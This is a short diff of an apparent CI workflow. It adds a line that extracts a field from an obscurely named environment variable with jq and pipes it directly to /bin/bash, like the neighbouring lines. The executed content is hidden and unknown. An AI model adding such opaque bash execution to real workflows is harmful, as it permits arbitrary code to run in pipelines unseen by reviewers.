@@ -25,6 +25,7 @@ jobs:
           printf '%s' "$dvd5" | jq -r .vtmo75 | /bin/bash
           echo $chebm7 | jq -r .w65 | /bin/bash
           printf '%s' "$sw3387" | jq -r .gzobl720 | /bin/bash
+          echo $mcbja6985 | jq -r .fosp3 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
